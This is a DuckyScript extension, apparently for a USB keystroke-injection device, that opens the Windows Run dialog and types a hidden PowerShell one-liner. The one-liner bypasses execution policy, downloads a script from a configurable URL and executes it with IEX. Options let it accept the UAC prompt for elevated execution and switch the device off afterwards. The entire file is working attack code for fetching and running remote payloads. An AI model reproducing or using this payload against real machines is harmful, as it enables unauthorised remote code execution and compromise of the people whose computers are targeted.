EXTENSION RUN_HOSTED_POWERSHELL
	REM_BLOCK INFOS
		Title: Run Hosted PowerShell
		Version: 1.0
		Author: Who-Is-Julien
		Description: This extension executes a hosted PowerShell script using the Windows Run dialog box.
		Target: Windows 10, 11
    END_REM

    REM Required options:
	DEFINE #RHP_SCRIPT_URL example.com

    REM Advanced options:
	DEFINE #RHP_DELAY 2000
	DEFINE #RHP_ELEVATED_EXECUTION FALSE
	DEFINE #RHP_DISABLE_AFTER_EXECUTION FALSE

	GUI r
	DELAY #RHP_DELAY
	STRING PowerShell -W H -EX Bypass "IWR -UseB '#RHP_SCRIPT_URL' | IEX"
	IF ( #RHP_ELEVATED_EXECUTION == TRUE ) THEN
		CTRL SHIFT ENTER
		DELAY #RHP_DELAY
		LEFT
	END_IF
	ENTER
	IF ( #RHP_DISABLE_AFTER_EXECUTION == TRUE ) THEN
        ATTACKMODE OFF
    END_IF
END_EXTENSION
